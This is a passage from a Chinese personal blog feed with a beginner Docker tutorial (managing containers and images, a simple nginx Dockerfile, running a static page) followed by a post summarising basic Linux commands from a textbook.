<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker ps -a
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
</div>
        </div>
    </div>
<h2 id="删除容器">删除容器</h2>
<p>如果这些容器不需要了怎么办,</p>
<p><del>比如玩坏了,要把它删掉</del></p>
<p>那就要用 <code>docker rm</code> 命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker rm 容器ID
</span></span></code></pre></td></tr></table>
</div>
</div><p>后面接上容器 ID 就能删除, 可以删除多个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker rm 6c8c8d9f5540 6c49bc1fdc49 eb71e810ee50 5a84d067d769 2addaf3666ef
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后在用 <code>docker ps -a</code> 来查看, 就看不到任何容器 ID 了</p>
<p></p>
<h2 id="镜像">镜像</h2>
<p>docker 容器运行的前提条件是它需要相应的镜像.</p>
<p>可以用 <code>docker images</code> 来查看本地已经有的镜像, 如果需要的别的镜像可以用 <code>docker pull</code> 来获取</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker images
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>我们来获取 php 的镜像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker pull php
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>等待他们自动下载完成,镜像就可以用了.</p>
<p>如果你运行容器的时候没有事先拉取镜像的话, docker 则会在运行容器的时候临时进行拉取.</p>
<p>下载进程完成之后, 我们查看一下现有的镜像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker images
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
</span></span><span class="line"><span class="cl">ubuntu       latest    a8780b506fa4   7 days ago    77.8MB
</span></span><span class="line"><span class="cl">php          latest    30e567f030d3   12 days ago   484MB
</span></span><span class="line"><span class="cl">httpd        latest    fe8735c23ec5   2 weeks ago   145MB
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>各个选项说明:<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li>
<p>REPOSITORY：表示镜像的仓库源</p>
</li>
<li>
<p>TAG：镜像的标签</p>
</li>
<li>
<p>IMAGE ID：镜像ID</p>
</li>
<li>
<p>CREATED：镜像创建时间</p>
</li>
<li>
<p>SIZE：镜像大小</p>
</li>
</ul>
<p>同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 <code>15.10</code>、<code>14.04</code> 等多个不同的版本，我们使用 <code>REPOSITORY:TAG</code> 来定义不同的镜像。</p>
<p><a href="https://www.runoob.com/docker/docker-image-usage.html" target="_blank" rel="noopener noreffer">引自菜鸟教程</a></p>
</div>
        </div>
    </div>
<h2 id="删除镜像">删除镜像</h2>
<p>当然, 不需要的镜像也是可以删除的.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker rmi 镜像ID
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>如图,这样就把不需要的镜像删除了</p>
<h2 id="dockerfile">dockerfile</h2>
<p>啥是 dockerfile? Dockerfile 是用来构建镜像文件的文本文件, 文件里面包含的是一条条指令和说明, 和一些 shell 脚本类似(比如 PKGBUILD )</p>
<p>而一个简单的 Dockerfile 是长这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> nginx</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s1">&#39;Hello World!&#39;</span> &gt; /usr/share/nginx/html/index.html<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>来自菜鸟教程的提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li><code>FROM</code> 定制的镜像都是基于 FROM 的镜像, 这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</li>
<li><code>RUN</code> 用于执行后面跟着的命令行命令。有以下俩种格式：</li>
</ul>
<p>shell 格式：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">RUN</span> &lt;命令行命令&gt;<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>exec 格式:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">RUN</span> <span class="o">[</span><span class="s2">&#34;可执行文件&#34;</span>, <span class="s2">&#34;参数1&#34;</span>, <span class="s2">&#34;参数2&#34;</span><span class="o">]</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 例如：</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># RUN [&#34;./test.php&#34;, &#34;dev&#34;, &#34;offline&#34;] 等价于 RUN ./test.php dev offline</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
        </div>
    </div>
<p>熟悉 Linux 操作的话, 上手这玩意也就很简单了, 但是值得注意的是菜鸟教程当中说的这一段:</p>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> centos</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> yum -y install wget<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> wget -O redis.tar.gz <span class="s2">&#34;http://download.redis.io/releases/redis-5.0.3.tar.gz&#34;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> tar -xvf redis.tar.gz<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>以上执行会创建 3 层镜像。可简化为以下格式：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> centos</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> yum -y install wget <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="o">&amp;&amp;</span> wget -O redis.tar.gz <span class="s2">&#34;http://download.redis.io/releases/redis-5.0.3.tar.gz&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="o">&amp;&amp;</span> tar -xvf redis.tar.gz<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
        </div>
    </div>
<p>也就是说我们要尽量在 RUN 当中写命令脚本的时候尽量写并列语句.</p>
<h2 id="一个简单的-web-服务器">一个简单的 Web 服务器.</h2>
<p>现在我想试试用 docker 来跑一个简单的网页了.</p>
<p>就跑一下我之前闲着没事干写的<a href="/simpleLogin/index.html" rel="">登录页面</a>吧.</p>
<p>首先我们要创建一个目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir webtest
</span></span></code></pre></td></tr></table>
</div>
</div><p>先把前端的静态文件复制进去</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cp test/* webtest/ -rv
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后进入该目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd webtest
</span></span></code></pre></td></tr></table>
</div>
</div><p>检查一下文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -lh
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">总计 4.0K
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 weepingdogel weepingdogel   23 11月10日 21:30 css
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 weepingdogel weepingdogel    6 11月10日 21:30 img
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 weepingdogel weepingdogel 1.4K 11月10日 21:30 index.html
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 weepingdogel weepingdogel   21 11月10日 21:30 js
</span></span></code></pre></td></tr></table>
</div>
</div><p>ok ,现在我们来写一个 dockerfile</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> nginx</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./index.html /usr/share/nginx/html/index.html<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./css/style.css /usr/share/nginx/html/css/style.css<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./js/main.js /usr/share/nginx/html/js/main.js<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>指令详解<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li>COPY</li>
</ul>
<p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p>
<p>格式：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">COPY</span> <span class="o">[</span>--chown<span class="o">=</span>&lt;user&gt;:&lt;group&gt;<span class="o">]</span> &lt;源路径1&gt;...  &lt;目标路径&gt;<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> <span class="o">[</span>--chown<span class="o">=</span>&lt;user&gt;:&lt;group&gt;<span class="o">]</span> <span class="o">[</span><span class="s2">&#34;&lt;源路径1&gt;&#34;</span>,...  <span class="s2">&#34;&lt;目标路径&gt;&#34;</span><span class="o">]</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong><code>[--chown=&lt;user&gt;:&lt;group&gt;]</code></strong>：可选参数，用户改变复制到容器内文件的拥有者和属组。</p>
<p><strong><code>&lt;源路径&gt;</code></strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">COPY</span> hom* /mydir/<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> hom?.txt /mydir/<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong><code>&lt;目标路径&gt;</code></strong>：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p>
</div>
        </div>
    </div>
<p>我的思路和正常的搭建方式一样,安装 nginx 之后再把写好的静态文件复制到web根目录就行, 但是用 docker 的效率高很多.</p>
<p>但是如果不用 docker 的话, 我至少要多花半个小时的时间去配置一个虚拟机, 配置软件源 安装 nginx 什么的, 花的时间就更多了, 而现在我只需要写一个脚本就能一键部署, 而且还能保存为镜像分享给别人,一劳永逸~</p>
<p>好了, 话不多说, 开始构建镜像</p>
<p>使用 <code>docker build</code> 命令通过目录下的 <code>dockerfile</code> 文件构建一个镜像,</p>
<p><code>-t</code> 的属性值是指 <strong><code>&lt;镜像名称:镜像标签&gt;</code></strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker build -t webtest:latest .
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意了, 我在最后面还加了一个 <code>.</code> , 这个叫做上写文路径, 也是指相对路径</p>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>什么叫上下文路径?<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</div>
        </div>
    </div>
<p>然后我们查看一下镜像列表</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker images
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>很明显,我们可以看到我们刚刚创建的镜像, 镜像 ID 是 <code>9acd8c30bd5b</code>.</p>
<p>那么接下来把它部署到容器里~ 用 <code>-p</code> 来指定端口绑定 <strong><code>&lt;外部端口:内部端口&gt;</code></strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker run -p 8080:80 -d 9acd8c30bd5b
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在我们已经把容器的 80 端口映射到了宿主机的 8080 端口~</p>
<p>然后访问我们的本地 IP + 8080 就可以访问到那个页面了, 我这里用 <code>127.0.0.1:8080</code> 访问</p>
<p></p>
<p>成功访问!</p>
<p>这样一来,快速部署 nginx 就完成了!</p>
<h1 id="结语">结语</h1>
<p>经过对 docker 初学习和初体验, 我也浅尝到了它的高效率和便捷性, 收获还是比较多的.</p>
<p>但目前还是一个入门的阶段,更多高级应用方法还等着去探索~</p>
<p>诶? 你问我难不难? QwQ ~</p>
<p>对 Linux 熟悉的人来玩这个没几天应该就能玩会了, 不过要做到深入的了解还是需要时间的.</p>
<p>那 就这样吧</p>
]]></description>
</item><item>
    <title>一天刷完《Linux网络操作系统应用基础教程》这本书</title>
    <link>http://weepingdogel.github.io/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/</link>
    <pubDate>Fri, 30 Sep 2022 19:25:48 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/photo_2022-09-30_20-14-56.jpg" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>多日不见，甚是想念。</p>
<p>这段时间开学了，忙了一阵， 好久没更新博客了。</p>
<p>教科书当中看到了这么一本书（上图），叫做《Linux网络操作系统应用基础教程》。第一眼感觉封面挺好看的，这种简约配色显得这本书有高级感&hellip;然而，翻了几页看了，发现这是一本基础书籍。</p>
<p>对于一个用了两年 Arch 又不喜欢看书的人来说，这本书里的内容学起来应该会很快吧。</p>
<p>抱着试试看的态度，我想一天肝完这本书。</p>
<h1 id="全书目录">全书目录</h1>
<p>首先来看一下目录， 差点笑出声。</p>
<p>很明显，这确实是一些基础内容。其中很大部分在两年 Arch 使用经验中也接触过。</p>
<p></p>
<p></p>
<p></p>
<p>看起来都是一些概念+基础+实践操作</p>
<h1 id="概念内容">概念内容</h1>
<p>大概是项目一到项目二的 2.1 的内容，讲了 Linux 的案例、历史、以及流行的发行版。</p>
<p>书中居然没有 Arch, 差评。</p>
<p>但是也描述了 Linux 可以用来运行各种服务，比如 DNS（<a href="https://zh.wikipedia.org/zh-cn/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener noreffer">Domain Name System</a>）服务、Web 服务器（Apache Nginx 这些提供基于HTTP协议的网页服务的）、基于 SMTP 协议的邮件服务器、以及 FTP 协议的文件传输服务器、基于 Samba 协议的文件共享服务器、<a href="https://zh.wikipedia.org/zh-ctiaoguo%B8%BB%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener noreffer">DHCP</a> 服务器 还有 VPN 服务器。</p>
<p>总之就是讲了 Linux 能干啥、Linux 的优点等， 这些可以通过搜索引擎查到，不多赘述。</p>
<h1 id="实操性内容">实操性内容</h1>
<p>往后都是一些操作性的内容，比如 Linux 的安装和搭建各种服务等</p>
<h2 id="安装-linux-操作系统">安装 Linux 操作系统</h2>
<p>书中讲用 VMware 装一个 CentOS 虚拟机。</p>
<p>高中的时候就会了，跳过。</p>
<h2 id="linux-基础操作">Linux 基础操作</h2>
<p>关于基础操作方面，我在初中的时候就写过一丢丢<a href="https://weepingdogel.github.io/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener noreffer">基础命令的笔记</a></p>
<p>书里也介绍了两种打开终端的方式，一个是在图形界面打开终端，另一种是按 <code>Ctrl</code> + <code>Alt</code> + <code>(F1 ~F6)</code> 来切换 tty。</p>
<p>然后是命令，大部分是加了 <code>-h</code> 参数以后的中文翻译，对于英语不太好的人来说，需要的时候翻阅一下也是一件美事。</p>
<p>另外我需要补充一些初中发的那篇文章当中没有写到的一些命令。</p>
<h3 id="cat">cat</h3>
<p>输出一个文件的内容，书中写的用法是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat [选项] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>但我们一般的用法是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个没什么好说的，也是常用的，但是遇到太长的文本就不太好了。</p>
<h3 id="less-和-more">less 和 more</h3>
<p>我几乎没见过有人用 more， 命令的使用方式都是一样的，但是效果可能不同吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">more [选项] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">less [选项] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>一般来说我们都不加什么选项的&hellip;</p>
<h3 id="head-和-tail">head 和 tail</h3>
<p>这个也没啥好说的，参数用法都一样，不过<del>前者看头后者看屁股</del>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">head [option] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tail [option] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>参数选项</p>
<ul>
<li>-n num 显示指定文件的末尾 num 行</li>
<li>-c num 显示指定文件的末尾 num 个字符。</li>
</ul>
<h3 id="rmdir">rmdir</h3>
<p>用来删除目录，用这个的话，删除的目录必须是空的。</p>
<p>否则会报错，和 <code>mkdir</code> 一样，可以加 <code>-p</code> 来进行递归删除。</p>
<p>递归是什么意思？就是一级一级往下删。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rmdir [option] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>然而我平时不喜欢用这个，我喜欢用 <code>rm -r</code> 或者 <code>rm -rfv</code> 。</p>
<h3 id="touch">touch</h3>
<p>touch 命令可以生成一个普通文件。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">touch [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="grep">grep</h3>
<p>这个用来查看文件中包含指定字符串的行，常用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grep [选项] [要查找的字符串] [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="tar">tar</h3>
<p>这个 tar 我平时就用来解压。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tar xvf [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>然而这是个打包命令， 相当于压缩文档。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tar [选项] [档案文件] [文件列表]
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>-c 生成档案文件</li>
<li>-v 列出归档文件解档的详细过程</li>
<li>-f 指定档案文件名称</li>
<li>-r 将文件追加到档案文件末尾</li>
<li>-z 以 gzip 格式压缩或解压</li>
<li>-j 以 bzip2 格式压缩或解压</li>
<li>-d 比较档案与当前目录中的文件</li>
<li>-x 解开档案文件</li>
</ul>
<p>可以用 <code>man</code> 来查看 <code>tar</code> 的更多信息。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man tar
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="rpm">rpm</h3>
<p>rpm 系发行版的离线软件包安装器。至少我是这么理解的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rpm [选项] [软件包名字]
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个软件包名字是指一个文件名哦， 一些 <code>.rpm</code> 后缀结尾的文件，就是 rpm 系的软件包。</p>
<p>安装好像是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rpm -i [软件包名字]
</span></span></code></pre></td></tr></table>
</div>
</div><p>其他的参数</p>
<ul>
<li>-v 安装过程显示详细信息</li>
<li>-h 安装过程中显示<code>#</code>号进度条</li>
<li>-e 删除软件包</li>
<li>-q 查看软件包是否已经安装</li>
</ul>
<p>也可以通过 <code>man</code> 来阅读手册</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
